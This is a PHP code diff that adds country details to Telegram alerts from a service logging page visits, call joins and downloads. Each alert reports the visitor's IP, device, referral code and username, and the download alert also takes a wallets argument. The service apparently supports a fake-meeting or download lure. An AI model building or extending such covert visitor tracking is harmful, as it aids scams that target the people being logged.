@@ -44,33 +44,51 @@ class TelegramService
         }
     }
 
-    public function notifyPageVisit($type, $reference, $ipAddress, $userAgent = null)
+    public function notifyPageVisit($type, $reference, $ipAddress, $userAgent = null, $countryInfo = null)
     {
         $message = "🟦 Переход на страницу\n";
         $message .= "📱 Устройство: " . $this->detectDevice($userAgent) . "\n";
-        $message .= "🌍 Гео: " . $ipAddress . " - " . $this->getCountryFlag($ipAddress) . "\n";
+        
+        if ($countryInfo && isset($countryInfo['country'])) {
+            $message .= "🌍 Гео: " . $ipAddress . " - " . $countryInfo['flag'] . " " . $countryInfo['country'] . "\n";
+        } else {
+            $message .= "🌍 Гео: " . $ipAddress . " - " . $this->getCountryFlag($ipAddress) . "\n";
+        }
+        
         $message .= "🔗 Код: " . ($reference ?: 'NO_REF') . "\n";
         $message .= "🗣 Юзер: " . ($this->extractUsername($userAgent) ?: 'N/A');
 
         return $this->sendMessage($message);
     }
 
-    public function notifyConferenceJoin($conferenceTitle, $inviteCode, $ipAddress, $userAgent = null)
+    public function notifyConferenceJoin($conferenceTitle, $inviteCode, $ipAddress, $userAgent = null, $countryInfo = null)
     {
         $message = "🟦 Вход в звонок\n";
         $message .= "📱 Устройство: " . $this->detectDevice($userAgent) . "\n";
-        $message .= "🌍 Гео: " . $ipAddress . " - " . $this->getCountryFlag($ipAddress) . "\n";
+        
+        if ($countryInfo && isset($countryInfo['country'])) {
+            $message .= "🌍 Гео: " . $ipAddress . " - " . $countryInfo['flag'] . " " . $countryInfo['country'] . "\n";
+        } else {
+            $message .= "🌍 Гео: " . $ipAddress . " - " . $this->getCountryFlag($ipAddress) . "\n";
+        }
+        
         $message .= "🔗 Код: " . $inviteCode . "\n";
         $message .= "🗣 Юзер: " . ($this->extractUsername($userAgent) ?: 'N/A');
 
         return $this->sendMessage($message);
     }
 
-    public function notifyDownload($type, $reference, $platform, $ipAddress, $userAgent = null, $wallets = null)
+    public function notifyDownload($type, $reference, $platform, $ipAddress, $userAgent = null, $wallets = null, $countryInfo = null)
     {
         $message = "🟦 Скачивание\n";
         $message .= "📱 Устройство: " . ucfirst($platform) . "\n";
-        $message .= "🌍 Гео: " . $ipAddress . " - " . $this->getCountryFlag($ipAddress) . "\n";
+        
+        if ($countryInfo && isset($countryInfo['country'])) {
+            $message .= "🌍 Гео: " . $ipAddress . " - " . $countryInfo['flag'] . " " . $countryInfo['country'] . "\n";
+        } else {
+            $message .= "🌍 Гео: " . $ipAddress . " - " . $this->getCountryFlag($ipAddress) . "\n";
+        }
+        
         $message .= "🔗 Код: " . ($reference ?: 'NO_REF') . "\n";
         $message .= "🗣 Юзер: " . ($this->extractUsername($userAgent) ?: 'N/A');
 
